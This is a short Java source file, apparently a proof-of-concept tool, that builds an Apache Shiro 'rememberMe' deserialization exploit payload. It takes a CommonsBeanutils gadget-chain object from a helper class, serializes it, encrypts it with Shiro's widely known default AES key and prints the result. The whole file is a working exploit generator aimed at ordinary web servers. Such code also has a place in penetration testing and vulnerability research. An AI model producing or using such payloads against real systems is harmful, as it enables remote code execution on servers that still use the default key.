package POC_macker.CBShiro;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.util.PriorityQueue;

public class Get_poc {
    public static void main(String[] args) throws Exception {
        String payload = get_payload();
        System.out.println(payload);
    }

    public static String get_payload() throws Exception {
        PriorityQueue payloadObject = CommomsBeanutilsShiro.getPayloadObject();

        byte[] payloadByte = CommomsBeanutilsShiro.get_ObjectToByteArray(payloadObject);

        String payload = encrypt(payloadByte,"kPH+bIxk5D2deZiIxcaaaA==");

        return payload;
    }


    public static String encrypt(byte[] plaintext, String _key){
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode(_key);
        ByteSource ciphertext = aes.encrypt(plaintext, key);
        return ciphertext.toString();
    }

}

